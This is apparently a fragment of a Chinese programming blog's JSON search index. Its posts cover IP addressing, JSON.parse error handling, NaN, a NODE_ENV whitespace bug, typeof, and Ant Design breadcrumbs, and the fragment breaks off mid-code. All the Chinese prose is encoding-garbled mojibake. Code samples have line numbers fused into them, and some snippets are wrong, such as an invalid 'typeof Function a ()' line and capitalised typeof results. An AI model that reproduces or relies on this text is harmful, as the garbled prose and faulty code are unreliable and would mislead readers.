åœ°å€æ¯ä¸€æ¬¡é€£æ¥ç¶²è·¯çš„æ™‚å€™ IP åœ°å€éƒ½ä¸ä¸€æ¨£ï¼š é›»è…¦1 =&gt; 20.241.73.84 é›»è…¦1 =&gt; 20.241.73.85 é›»è…¦1 =&gt; 40.13.73.85 é€™ç¨® IP åœ°å€ã€Œæœƒè®Šä¾†è®Šå»ã€ï¼Œä½†æ˜¯åˆ¥äººé‚„æ˜¯å¯ä»¥é€éé€™å€‹ IP åœ°å€ä¾†ç›´æ¥é€£åˆ°ä½ çš„é›»è…¦ã€‚ ç‚ºä»€éº¼è¦æœ‰æµ®å‹• IPï¼Ÿ 1. éœ€æ±‚æ€§ ä¸€èˆ¬ç”¨æˆ¶å…¶å¯¦ä¸åƒä¼ºæœå™¨ä¸€æ¨£éœ€è¦æœ‰å›ºå®š IP åœ°å€é€™ç¨®éœ€æ±‚ï¼Œåæ­£çœŸçš„éœ€è¦è·Ÿæœ‹å‹é€£ç·šçš„æ™‚å€™åœ¨è²¼ IP åœ°å€çµ¦å°æ–¹å°±å¥½ 2. å®‰å…¨æ€§ å¦‚æœè¢«é§­å®¢ç™¼ç¾è‡ªå·±çš„ IP åœ°å€ï¼Œä¸‹ä¸€æ¬¡é€£ç·šçš„æ™‚å€™ IP åœ°å€å°±ä¸ä¸€æ¨£äº†ï¼Œæ¯”è¼ƒèƒ½é™ä½è¢«æ”»æ“Šçš„å¯èƒ½ã€‚ è™›æ“¬ IP åœ°å€é¦–å…ˆä½ é€£åˆ°ç¶²è·¯ï¼ˆwifiï¼‰çš„æ™‚å€™æœƒç”¢ç”Ÿä¸€å€‹è™›æ“¬ IP åœ°å€ï¼Œåƒé€™æ¨£ï¼š æ‰€ä»¥é€™å€‹æ™‚å€™å°±æœƒåˆ†æˆã€Œå…§ç¶²ã€è·Ÿã€Œå¤–ç¶²ã€çš„æ¦‚å¿µï¼Œåƒé€™æ¨£ï¼š ç°¡å–®ä¾†èªªï¼Œé€£æ¥åˆ°ã€ŒåŒå€‹ç¶²è·¯ã€çš„äººå°±ä»£è¡¨ä»–å€‘è™•åœ¨ã€ŒåŒå€‹å…§ç¶²ã€ï¼Œåœ¨å…§ç¶²çš„äººéƒ½æœƒæœ‰ä¸€å€‹ è™›æ“¬ IP åœ°å€ï¼Œåƒä¸Šé¢çš„ 192.168.0.20ã€‚è€Œå¤–ç¶²çš„éƒ¨åˆ†å‰‡æ˜¯ã€Œæ•¸æ“šæ©Ÿã€ï¼Œä»£è¡¨ã€Œå¯¦éš›å°å¤–å…¬é–‹çš„ IPã€ã€‚ èˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­ä½ é€£åˆ° googleï¼Œé‚£ google çš„ä¼ºæœå™¨æœƒçœ‹åˆ°ä½ é¡¯ç¤ºçš„ IP åœ°å€æ˜¯å°å¤–å…¬é–‹çš„é‚£å€‹ 20.46.77.58ï¼Œè€Œä¸æ˜¯ 192.168.0.20ã€‚ åˆ¥äººæ˜¯æ²’æœ‰è¾¦æ³•é€éè™›æ“¬ IP åœ°å€ä¾†è·Ÿä½ é€£ç·šçš„ï¼Œåªæœ‰è™•åœ¨åŒå€‹å…§ç¶²ï¼ˆé€£åŒå€‹ wifiï¼‰çš„äººå¯ä»¥ç›´æ¥é€£æ¥åˆ°å½¼æ­¤çš„é›»è…¦ï¼Œåƒä¸Šé¢åœ–ä¸­çš„ é›»è…¦1 å°±å¯ä»¥é€£åˆ° é›»è…¦2ï¼Œé›»è…¦2 å¯ä»¥é€£åˆ° é›»è…¦3ï¼Œä»¥æ­¤é¡æ¨ã€‚ å¦å¤–é‚„æœ‰ä¸€å€‹å¾ˆé‡è¦çš„è§€å¿µï¼šè™›æ“¬ IP åœ°å€æ˜¯å¯ä»¥é‡è¤‡çš„ ä¾‹å¦‚èªªä½ åœ¨ä½ å®¶å…§ç¶²çš„è™›æ“¬ IP åœ°å€å¯èƒ½æ˜¯ 192.168.0.20ï¼Œåˆ¥äººåœ¨ä»–å®¶å…§ç¶²çš„è™›æ“¬ IP åœ°å€ä¹Ÿå¯ä»¥æ˜¯ 192.168.0.20ã€‚æ‰€ä»¥ã€ŒåŒå€‹ IP ä¸ä»£è¡¨æ˜¯åŒä¸€å°é›»è…¦ã€ï¼Œæœ‰å¯èƒ½åªæ˜¯ä¸åŒå…§ç¶²è£¡çš„é›»è…¦ç½·äº†ã€‚ å…¶å¯¦ä»”ç´°æƒ³æƒ³ä¹Ÿåˆç†ï¼Œç•¢ç«Ÿæ¯å€‹äººå®¶éƒ½æœ‰ä¸€å€‹çœŸæ­£å°å¤–å…¬é–‹çš„ IP åœ°å€ï¼Œæ‰€ä»¥å…§ç¶²è£¡é¢é‡è¤‡ä¹Ÿæ²’ä»€éº¼å¥½å¥‡æ€ªçš„ï¼Œåæ­£åˆ¥äººåˆæ²’è¾¦æ³•é€éè™›æ“¬ IP åœ°å€ä¾†è·Ÿä½ é€£ç·šã€‚ é‚£å¯¦éš›è¦è·Ÿåˆ¥äººé€£ç·šæ€éº¼åšï¼Ÿ å…¶å¯¦å°±æ˜¯é€éã€Œæ•¸æ“šæ©Ÿã€ä¾†åšåˆ°ï¼Œä½ æƒ³é€£ç·šåˆ°å¤–é¢ï¼ˆä¾‹å¦‚ googleï¼‰ä¾†å–å¾—ç¶²é è³‡æ–™ï¼Œé‚£å°±é€éæ•¸æ“šæ©Ÿå°å¤–å…¬é–‹çš„ IP åœ°å€ä¾†è·Ÿ google çš„ä¼ºæœå™¨æºé€šï¼Œæ¥è‘—æ•¸æ“šæ©Ÿåœ¨æŠŠè³‡æ–™ä¸Ÿå›ä¾†çµ¦å…§ç¶²è£¡çš„é›»è…¦ã€‚ åƒè€ƒé€™å€‹æµç¨‹ï¼š 192.168.0.20ï¼ˆé›»è…¦1ï¼‰è·Ÿ 20.46.77.58ï¼ˆæ•¸æ“šæ©Ÿï¼‰èªªã€Œæˆ‘æƒ³è¦é€ è¨ª google.comã€ 20.46.77.58ï¼ˆæ•¸æ“šæ©Ÿï¼‰è·Ÿ 172.217.160.110ï¼ˆgoogle ä¸»æ©Ÿï¼‰èªªã€Œæˆ‘æƒ³è¦é€ è¨ª google.comã€ google ä¸»æ©ŸæŠŠ response å‚³çµ¦æ•¸æ“šæ©Ÿ æ•¸æ“šæ©Ÿå†æŠŠ response å‚³çµ¦é›»è…¦1 ç‚ºä»€éº¼è¦æœ‰è™›æ“¬ IP åœ°å€ï¼Ÿæœ‰ä»€éº¼å¥½è™•ï¼Ÿ 1. éœ€æ±‚æ€§ ä¸€èˆ¬ç”¨æˆ¶å…¶å¯¦å¤§å¤šæ•¸æƒ…æ³ä¸éœ€è¦æœ‰å›ºå®šçš„ IP åœ°å€ï¼Œå› ç‚ºæ²’ä»€éº¼æ©Ÿæœƒç”¨åˆ°ï¼ˆè·Ÿåˆ¥äººç›´æ¥é€£ç·šï¼‰ã€‚ 2. ç¯€çœè³‡æº é›»ä¿¡å•†ä¸ç”¨çµ¦æ¯å°é›»è…¦åˆ†é…ä¸€å€‹å›ºå®š IP åœ°å€ï¼Œåªè¦åˆ†é…çµ¦æ•¸æ“šæ©Ÿå°±å¥½ã€‚","link":"/2022/01/05/about-ip-address/"},{"title":"åœ¨åš JSON.parse ä¹‹å‰","text":"æ›´åš´è¬¹çš„åšæ³•ã€‚ éŒ¯èª¤ç¤ºç¯„12let str = '[123'let json = JSON.parse(str) // SyntaxError: Unexpected end of JSON input æ›´å¥½çš„åšæ³•åŠ ä¸Š try catchï¼š 1234567891011let str = '[123'try { // æ­£ç¢ºçš„è™•ç† let json = JSON.parse(str) console.log(json)} catch (error) { // éŒ¯èª¤çš„è™•ç† console.log('å‡ºéŒ¯å•¦') console.log(error)}console.log('ä¸æœƒè¢«ä¸­æ–·ï¼Œé‚„æ˜¯å¯ä»¥åŸ·è¡Œ') å‚™è¨»ï¼šcatch ä¸­çš„ error æ˜¯æŠŠéŒ¯èª¤è¨Šæ¯ã€Œå­—ä¸²ã€çµ¦å°å‡ºä¾†ï¼Œä¸æ˜¯ä¸­æ–·åŸ·è¡Œã€‚ æ‰€ä»¥å°±ç®— JSON.parse å‡ºéŒ¯ä½ çš„ç¨‹å¼ä¹Ÿä¸æœƒç›´æ¥æ›æ‰ï¼Œä¸¦ä¸”èƒ½è‰¯å¥½çš„å°ã€Œæ­£ç¢ºã€è·Ÿã€ŒéŒ¯èª¤ã€å„åˆ¥è™•ç†ã€‚","link":"/2022/01/08/about-json-parse/"},{"title":"é—œæ–¼ NaN é€™å€‹æ±è¥¿","text":"å¥‡å¦™çš„æ±è¥¿ï½ ç°¡è¿°é€™é‚Šå…ˆå¼·èª¿ä¸€ä¸‹ï¼š NaN ä¸æ˜¯ä¸€ç¨®è³‡æ–™å‹æ…‹ NaN ä¸æ˜¯ä¸€ç¨®è³‡æ–™å‹æ…‹ NaN ä¸æ˜¯ä¸€ç¨®è³‡æ–™å‹æ…‹ NaN å…¶å¯¦æ˜¯ä¸€å€‹ numberï¼š 12console.log(typeof NaN); // numberconsole.log(Number('abc')); // NaN åªä¸éå®ƒæœ‰ä¸€å€‹å¾ˆå¥‡è‘©çš„ç¾è±¡ï¼š 12const a = Number('abc') // NaNconsole.log(a === a) // false å±…ç„¶æœ‰è®Šæ•¸ä¸ç­‰æ–¼è®Šæ•¸è‡ªå·±çš„æƒ…æ³ï¼Ÿæ²’éŒ¯ï¼Œé€™å°±æ˜¯ NaN çš„ç‰¹æ€§ï¼Œå®ƒä¸ç­‰æ–¼ä»»ä½•äººï¼Œå³ä¾¿æ˜¯å®ƒè‡ªå·±ã€‚ æ‰€ä»¥å°±ç‰¹åˆ¥è¨˜ä¸€ä¸‹å°±å¥½ï¼ŒNaN å°±æ˜¯å€‹ç‰¹æ®Šçš„ caseã€‚å¦‚æœä½ çœŸçš„è¦æª¢æŸ¥ä¸€å€‹è®Šæ•¸æ˜¯ä¸æ˜¯ NaN å¯ä»¥ç”¨ isNaN ä¾†æª¢æŸ¥ï¼š 123console.log(isNaN(NaN)); // trueconsole.log(isNaN('abc')); // trueconsole.log(isNaN('123')); // false '123' é€™å€‹ case ä½ èƒ½æƒ³æˆæ˜¯é€™æ¨£ï¼š 1console.log(isNaN(Number('123'))); é€™æ¨£å°±ä¸æœƒè¦ºå¾—å›°æƒ‘äº†ã€‚","link":"/2022/03/06/about-nan/"},{"title":"é—œæ–¼ NODE_ENV çš„åœ°é›·","text":"ä¸€å€‹æœƒæ‡·ç–‘äººç”Ÿçš„ bugã€‚ ç°¡è¿°åœ¨è¬› bug ä¹‹å‰å…ˆå¹«ä½ è¤‡ç¿’ä¸€ä¸‹ NODE_ENV çš„ç”¨æ³•ï¼š åˆ° package.json è¨­å®š script 123456{ \"scripts\": { \"test\": \"jest\", \"start\": \"set NODE_ENV=hello &amp;&amp; node index.js\" }} åˆ°å°æ‡‰çš„æª”æ¡ˆè£¡é¢å¯« JS 12// index.jsconsole.log('my NODE_ENV: ' + process.env.NODE_ENV); æœ€å¾Œç”¨ npm run çš„æ–¹å¼ä¾†åŸ·è¡Œï¼ˆåªæœ‰é€éé€™ç¨®æ–¹å¼æ‰èƒ½å­˜å–åˆ°å¯«åœ¨ script ä¸­çš„ç’°å¢ƒè®Šæ•¸ï¼‰ 1npm run start è¼¸å‡ºçµæœï¼š 1my NODE_ENV: hello çœ‹èµ·ä¾†å¾ˆåˆç†ï¼Œä½†é€™æ™‚å€™å¦‚æœä½ é€™æ¨£å¯«ï¼š 1console.log('is equal: ', process.env.NODE_ENV === 'hello'); // true / false ? æˆ‘æœ¬ä¾†ä¹Ÿæƒ³èªªä¸å°± true å—ï¼Ÿå…§å®¹ä¸€æ¨£ï¼Œå‹åˆ¥ä¹Ÿæ­£ç¢ºï¼Œæœ‰ä»€éº¼å¥½ false çš„ï¼Ÿ ä½†æ˜¯ï¼Œçµæœç¢ºå¯¦æ˜¯ falseã€‚ æ­é–‹å¹•å¾Œå°±ç›´æ¥èªªå§ï¼Œå…¶å¯¦æ˜¯å› ç‚ºã€Œç©ºç™½å­—å…ƒã€çš„é—œä¿‚ï¼š 1234567{ \"scripts\": { \"test\": \"jest\", // NODE_ENV=helloï¼ˆç©ºæ ¼ï¼‰&amp;&amp;ï¼ˆç©ºæ ¼ï¼‰node index.js \"start\": \"set NODE_ENV=hello &amp;&amp; node index.js\" }} ä½ å¯ä»¥è©¦è‘—ç”¨ JSON.stringify å°å‡ºä¾†çœ‹å°±çŸ¥é“åŸå› äº†ï¼š 12NODE_END: \"hello \" // &lt;- çµå°¾å¤šä¸€å€‹ç©ºæ ¼My string: \"hello\" æ‰€ä»¥çµè«–å°±æ˜¯ç©ºç™½å­—å…ƒçš„é—œä¿‚æ‰å°è‡´ false çš„ï¼ŒæŠŠç©ºæ ¼æ‹¿æ‰å°±æ­£å¸¸äº†ï¼š 123456{ \"scripts\": { \"test\": \"jest\", \"start\": \"set NODE_ENV=hello&amp;&amp; node index.js\" }} 123console.log('NODE_END: ', JSON.stringify(process.env.NODE_ENV));console.log('My string: ', JSON.stringify('hello'));console.log('Is equal: ', process.env.NODE_ENV === 'hello'); è¼¸å‡ºçµæœï¼š 123NODE_END: \"hello\"My string: \"hello\"Is equal: true æ‰€ä»¥ä»¥å¾Œåœ¨ç”¨é€™ç¨®æ±è¥¿æ™‚ï¼Œæœ€å¥½ç¢ºä¿ &amp;&amp; å‰å¾Œæ²’å‡ºç¾ç©ºç™½å­—å…ƒï¼Œä¸ç„¶å°±æœƒåƒæˆ‘ä¸€æ¨£è¢«é›·çš„ä¸è¦ä¸è¦çš„ã€‚","link":"/2022/04/02/about-node-env/"},{"title":"é—œæ–¼ typeof å’Œè³‡æ–™å‹æ…‹","text":"å°çŸ¥è­˜ã€‚ ç°¡è¿°åœ¨è«‡ typeof å‰ï¼Œå…ˆä¾†è¤‡ç¿’ä¸€ä¸‹ JS çš„è³‡æ–™å‹æ…‹ã€‚ JavaScript è£¡çš„è³‡æ–™å‹æ…‹å¯ä»¥åˆ†æˆå…©å¤§é¡ï¼Œä¸€å€‹æ˜¯ã€ŒPrimitiveã€ï¼Œä¸€å€‹æ˜¯ã€ŒObjectã€ã€‚ Primitive String Number Boolean undefined null symbol Object Object Array Function æœ€å¾Œä¹Ÿè¤‡ç¿’ä¸€ä¸‹ï¼ŒPrimitive éƒ½å±¬æ–¼ Immutableï¼ˆä¸å¯ä»¥æ”¹è®Šï¼‰ã€‚ ä½ ä¸å¯èƒ½å»æ”¹åŸæœ¬çš„å€¼ï¼Œé™¤éä½ é‡æ–°è³¦å€¼ã€‚ä¾†çœ‹å€‹ä¾‹å­ï¼š 123const str = 'hello';str.toUpperCase(); // å›å‚³ä¸€å€‹æ–°çš„å­—ä¸²console.log(str); // 'hello' é‚„æ˜¯åŸæœ¬çš„å€¼ é‚£ mutable å‘¢ï¼Ÿæœ€ç°¡å–®çš„ä¾‹å­å°±æ˜¯ Array 123const arr = [1];arr.push(2); // é€™æ‰æ˜¯çœŸçš„æ”¹è®ŠåŸæœ¬çš„å€¼console.log(arr); // [1, 2] æŸ¥çœ‹å‹æ…‹çš„æ–¹æ³•æ‰€ä»¥å¦‚æœè¦çœ‹ä¸€å€‹è®Šæ•¸çš„è³‡æ–™å‹æ…‹ï¼Œé€šå¸¸æœƒç”¨ typeof ä¾†çœ‹ï¼š 123console.log(typeof 'abc'); // string console.log(typeof 123); // numberconsole.log(typeof true) // boolean å¯æ˜¯æœ‰äº›æ¡ˆä¾‹æ¯”è¼ƒç‰¹åˆ¥ï¼Œä¾‹å¦‚èªª Arrayã€Function å’Œ Nullï¼š 123console.log(typeof []); // Objectconsole.log(typeof Function a () { return a}); // Functionconsole.log(typeof null); // Object æ‰€ä»¥ typeof æ²’æœ‰è¾¦æ³•å¾ˆç²¾æº–çš„æª¢æŸ¥å‹æ…‹ã€‚ç¶²è·¯æœ‰ä¸€å¼µè¡¨æœ‰åˆ—å‡ºæ¯å€‹è®Šæ•¸ typeof çš„å€¼æ˜¯ä»€éº¼ï¼Œæœ‰èˆˆè¶£å¯ä»¥è‡ªå·±æŸ¥ã€‚ é‚£è©²æ€éº¼è§£æ±ºå‘¢ï¼Ÿç•™åˆ°å¾Œé¢åœ¨å‘Šè¨´ä½ ï¼Œé€™é‚Šå…ˆä¾†çœ‹ä¸€ä¸‹ null é€™å€‹ç‰¹åˆ¥çš„å‹æ…‹ã€‚ null å…¶å¯¦æ˜¯å€‹å»£ç‚ºäººçŸ¥çš„ Bugï¼Œæ²’æœ‰ä¿®æ­£æ˜¯æ€•æ”¹äº†å¾ˆå¤šæ±è¥¿æœƒå£æ‰ã€‚è€Œæœƒæœ‰é€™ bug æ˜¯å› ç‚º JS åº•å±¤åœ¨å¯¦ä½œ type æ™‚æœƒç”¨ã€Œtagã€ä¾†è¡¨ç¤ºä¸€å€‹è®Šæ•¸çš„å‹æ…‹ã€‚Object çš„ tag æ˜¯ 0ï¼Œè€Œ null é€šå¸¸æ˜¯ç”¨æŒ‡æ¨™ï¼ˆ0x00ï¼‰ï¼Œæ‰€ä»¥å°±ä¹Ÿè¢«ç•¶æˆ 0ï¼Œå¾—åˆ° Object çš„çµæœã€‚ æœ‰æ²’æœ‰æ›´åš´è¬¹çš„æª¢æŸ¥æ–¹å¼ï¼Ÿå¦‚æœæ˜¯ Array çš„è©±ï¼Œå¯ä»¥æ”¹ç”¨é€™å€‹æ–¹æ³•ï¼š 1console.log(Array.isArray([])); // true ä¸éè¦æ³¨æ„ï¼Œæ¯”è¼ƒèˆŠçš„ç€è¦½å™¨ä¸æ”¯æ´ã€‚ æ‰€ä»¥å¦‚æœæƒ³æ›´ä¿éšªçš„è©±ï¼Œå¯ä»¥ç”¨ä¸‹é¢é€™å€‹åšæ³•ï¼š Object.prototype.toString.call(data) 123456// [object Number]console.log(Object.prototype.toString.call(1));// [object Array]console.log(Object.prototype.toString.call([]));// [object Null]console.log(Object.prototype.toString.call(null));","link":"/2022/03/06/about-typeof/"},{"title":"Ant Designï¼Breadcrumb","text":"çªç„¶æ‡·å¿µèµ·ä»¥å‰æ‰‹åˆ»éºµåŒ…å±‘çš„æ™‚å…‰ã€‚ æœ€åŸºæœ¬çš„çµæ§‹åŸºæœ¬çµæ§‹æœƒç”± &lt;Breadcrumb&gt; åŒ… &lt;Breadcrumb.Item&gt; ä¾†çµ„æˆã€‚ è€Œ &lt;Breadcrumb.Item&gt; è£¡é¢å¯ä»¥æ”¾æˆ‘å€‘æƒ³æ”¾çš„å…ƒä»¶ï¼Œä¾‹å¦‚ &lt;a&gt; æˆ– &lt;Link&gt;ã€‚ 123456789101112131415161718192021222324import React from 'react'import { Breadcrumb } from 'antd'function App() { return ( &lt;&gt; &lt;h2&gt;Bread crumb&lt;/h2&gt; &lt;Breadcrumb&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;App&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;List&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Detail&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;/&gt; )}export default App è¼¸å‡ºçµæœï¼š å› ç‚ºæ˜¯éºµåŒ…å±‘ï¼Œæ‰€ä»¥æœ€å¾Œä¸€å€‹ item æœƒè‡ªå‹•åŠ ä¸Š active çš„æ¨£å¼ï¼ˆæœ€å¾Œä¸€å€‹ç­‰æ–¼ç›®å‰æ‰€åœ¨ä½ç½®ï¼‰ï¼Œä¸ç”¨è‡ªå·±åšè™•ç†ã€‚ æŒ‡å®šé–“éš”ç¬¦å¯ä»¥ç”¨ separator é€™å€‹å±¬æ€§ä¾†è™•ç†ï¼š 12345678910111213141516171819202122232425import React from 'react'import { Breadcrumb } from 'antd'function App() { return ( &lt;&gt; &lt;h2&gt;Bread crumb&lt;/h2&gt; {/* æŒ‡å®šç‚º &gt; */} &lt;Breadcrumb separator='&gt;'&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;App&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;List&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Detail&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;/&gt; )}export default App ç•¶ç„¶ä¹Ÿå¯ä»¥æ”¾å…¥å…ƒä»¶ï¼š 1234567891011121314151617181920212223242526import React from 'react'import { Breadcrumb } from 'antd'import { CaretRightOutlined } from '@ant-design/icons'function App() { return ( &lt;&gt; &lt;h2&gt;Bread crumb&lt;/h2&gt; {/* æ”¾å…¥ icon å…ƒä»¶ */} &lt;Breadcrumb separator={&lt;CaretRightOutlined /&gt;}&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;App&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;List&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Detail&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;/&gt; )}export default App è¼¸å‡ºçµæœï¼š èˆ‡ React è·¯ç”±åšé€£çµé€™å€‹æˆ‘è¦ºå¾—å‰›é–‹å§‹ç¢°çš„è©±æœ‰é»å°è¤‡é›œï¼Œæ‰€ä»¥ä¸å¤ªæ‡‚çš„è©±å»ºè­°è·Ÿè‘—å¯¦ä½œçœ‹çœ‹ã€‚ å…ˆä¾†çœ‹ä¸€ä¸‹æœ€å¾Œçš„æˆæœï¼š ä¸»è¦çš„æ€è·¯æ˜¯é€™æ¨£ï¼š å–å¾—ç›®å‰æ‰€åœ¨çš„è·¯å¾‘ æŠŠè·¯å¾‘æ‹†é–‹ä¾†ï¼Œä¾‹å¦‚ /app/listï¼Œ æœƒè¢«æ‹†æˆ ['app', list] åˆ©ç”¨ç¬¬äºŒæ­¥çš„é™£åˆ—ä¾†ç”¢ç”Ÿç¶²å€ ['app', 'list'] =&gt; /appã€/app/list å»ºç«‹ä¸€å€‹ mapï¼Œä¸€å€‹ç¶²å€æœƒå°æ‡‰åˆ°ä¸€å€‹åç¨±ï¼ˆç”¨ä¾†é¡¯ç¤ºåœ¨éºµåŒ…å±‘ä¸Šçš„ï¼‰ åˆ©ç”¨ä¸Šé¢ç”¢ç”Ÿçš„ã€Œç¶²å€ã€å’Œã€Œmapã€ä¾†ç”¢ç”ŸéºµåŒ…å±‘å…ƒä»¶ æ¥è‘—å°±ä¾†çœ‹ code å§ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import React from 'react'import { Breadcrumb } from 'antd'import { CaretRightOutlined } from '@ant-design/icons'import { Routes, Route, Link, Outlet, useLocation } from 'react-router-dom'import Home from './Home'import App from './App'import List from './List'import Detail from './Detail'interface NameMap { [key: string]: string}// ç”¨ä¾†åšæ˜ å°„çš„ mapconst breadcrumbNameMap: NameMap = { '/app': 'App', '/app/list': 'List', '/app/list/detail': 'Detail'}function Main() { const location = useLocation() // æŠ“å‡ºç›®å‰çš„è·¯å¾‘ï¼ˆé¦–é çš„è©±æœƒæ˜¯ç©ºå­—ä¸²ï¼Œæ‰€ä»¥æœƒç”¨ filter éæ¿¾æ‰ï¼‰ const pathSnippets = location.pathname.split('/').filter((i) =&gt; i) // æ ¹æ“šè·¯å¾‘ä¾†ç”¢ç”Ÿéœ€è¦çš„å…ƒä»¶ const extraBreadcrumbItems = pathSnippets.map((_, index) =&gt; { // é€™é‚Šçš„é‚è¼¯è¦æƒ³ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹æˆé€™æ¨£å­ï¼š // ç¬¬ä¸€å€‹éºµåŒ…å±‘çš„é€£çµæ˜¯ /appï¼Œæ‰€ä»¥ = ['app', 'list'].slice(0, 1).join('/') // ç¬¬äºŒå€‹éºµåŒ…å±‘çš„é€£çµæ˜¯ /app/listï¼Œæ‰€ä»¥ = ['app', 'list'].slice(0, 2).join('/') const url = `/${pathSnippets.slice(0, index + 1).join('/')}` // æœ€å¾ŒæŠŠå€¼å¡«åˆ°éºµåŒ…å±‘å…ƒä»¶ä¸­ï¼ˆåˆ¥å¿˜äº†åŠ ä¸Š keyï¼‰ return ( &lt;Breadcrumb.Item key={url}&gt; &lt;Link to={url}&gt;{breadcrumbNameMap[url]}&lt;/Link&gt; &lt;/Breadcrumb.Item&gt; ) }) // é¦–é  + ä¸Šé¢ç”¢ç”Ÿçš„éºµåŒ…å±‘ï¼ˆå› ç‚ºæ˜¯é™£åˆ—ï¼Œæ‰€ä»¥åˆ¥å¿˜äº†åŠ ä¸Š keyï¼‰ const breadcrumbItems = [ &lt;Breadcrumb.Item key={'Home'}&gt; &lt;Link to=''&gt;Home&lt;/Link&gt; &lt;/Breadcrumb.Item&gt; ].concat(extraBreadcrumbItems) return ( &lt;&gt; &lt;Breadcrumb style={{ marginBottom: '30px' }} separator={&lt;CaretRightOutlined /&gt;} &gt; {/* æœ€å¾ŒæŠŠç”¢ç”Ÿå¥½çš„ item æ”¾é€²ä¾†å°±å¯ä»¥äº† */} {breadcrumbItems} &lt;/Breadcrumb&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;Home /&gt;} /&gt; &lt;Route path='app' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;App /&gt;} /&gt; &lt;Route path='list' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;List /&gt;} /&gt; &lt;Route path='detail' element={&lt;Detail /&gt;} /&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Routes&gt; &lt;/&gt; )}export default Main è‡³æ–¼è·¯ç”±çš„éƒ¨åˆ†çœ‹ä¸å¤ªæ‡‚çš„è©±ï¼Œå¯ä»¥åƒè€ƒæˆ‘ä¹‹å‰å¯«çš„é€™ç¯‡ã€‚ å¦ä¸€ç¨®åšæ³•ï¼ŒæŠ½å‡ºå»ç•¶æˆä¸€å€‹å…ƒä»¶å‰›å‰›çš„åšæ³•å…¶å¯¦æœ‰å€‹å•é¡Œï¼Œå°±æ˜¯æ²’è¾¦æ³•è™•ç†ã€Œå‹•æ…‹è·¯ç”±ã€çš„ mappingã€‚ å›é¡§ä¸€ä¸‹ï¼Œç•¶æ™‚ map çš„éƒ¨åˆ†æˆ‘å€‘æ˜¯é€™æ¨£å¯«çš„ï¼š 123456// ç”¨ä¾†åšæ˜ å°„çš„ mapconst breadcrumbNameMap = { '/app': 'App', '/app/list': 'List', '/app/list/detail': 'Detail'} å•é¡Œåœ¨æ–¼ï¼Œå¦‚æœç¾åœ¨ç¶²å€æ˜¯ /app/list/:id çš„è©±ï¼Œmap è¦æ€éº¼å¯«ï¼Ÿå¥½åƒå°±æ²’è¾¦æ³•äº†ï¼Œé›–ç„¶ç¡¬è¦çš„è©±æ˜¯å¯ä»¥å¯«æˆé€™æ¨£ï¼š 123456789101112131415const breadcrumbNameMap = { '/app': 'App', '/app/list': 'List'}// æ“·å‡ºè·¯å¾‘ç‰‡æ®µconst pathSnippets = location.pathname.split('/').filter((i) =&gt; i)// æª¢æŸ¥æœ€å¾Œä¸€å€‹ç‰‡æ®µæ˜¯ä¸æ˜¯æ•¸å­—if (parseInt(pathSnippets[pathSnippets.length - 1], 10)) { // åŠ ä¸Šå‹•æ…‹è·¯ç”±çš„ map for (let i = 1; i &lt;= parseInt(pathSnippets[pathSnippets.length - 1], 10); i++) { breadcrumbNameMap[`/app/list/${i}`] = `List of ${i}` }} é™„è¨»ï¼šæœ‰èˆˆè¶£çš„è©±å¯ä»¥åˆ°é€™é‚Šåƒè€ƒç¯„ä¾‹ é›–ç„¶é€™ä¹Ÿä¸å¤±ç‚ºä¸€ç¨®åšæ³•ï¼Œä¸éå¦‚æœæƒ³æ›´æœ‰å½ˆæ€§ä¸€äº›çš„è©±ï¼Œå¯ä»¥è©¦è‘—ç”¨ã€ŒæŠ½å‡ºå»è®Šæˆå…ƒä»¶ã€é€™ç¨®æ€ç¶­ä¾†åšã€‚ é€™æœƒæœ‰é»é¡ä¼¼ HOC çš„æ„Ÿè¦ºã€‚ç°¡å–®ä¾†èªªï¼Œæˆ‘å€‘å¯ä»¥è‡ªè£½ä¸€å€‹å…ƒä»¶ï¼Œå®ƒæœƒæ¥æ”¶ä¸€å€‹ propsï¼Œé€™å€‹ props è¦åŒ…å«é€™äº›è³‡è¨Šï¼š 12345type Paths = { url: string // ç¶²å€ labal: string // é¡¯ç¤ºåœ¨éºµåŒ…å±‘ä¸Šçš„æ–‡å­— access: boolean // ç”¨ä¾†æ±ºå®šè¦é¡¯ç¤ºé€£çµ or ç´”æ–‡å­—} è€Œé€™å…ƒä»¶å°±æœƒæ ¹æ“š props ä¾†ç”¢ç”Ÿå°æ‡‰çš„éºµåŒ…å±‘å…ƒä»¶ï¼š 123456789101112131415161718192021222324252627282930313233343536import { Breadcrumb } from 'antd'import { Link } from 'react-router-dom'import React from 'react'export type Paths = { url: string label: string access: boolean}interface Props { paths: Paths[]}const PageBreadcrumb: React.FC&lt;Props&gt; = ({ paths }) =&gt; { // æ ¹æ“š props ç”¢ç”ŸéºµåŒ…å±‘ item const Breadcrumbitems = paths.map((path) =&gt; { return ( 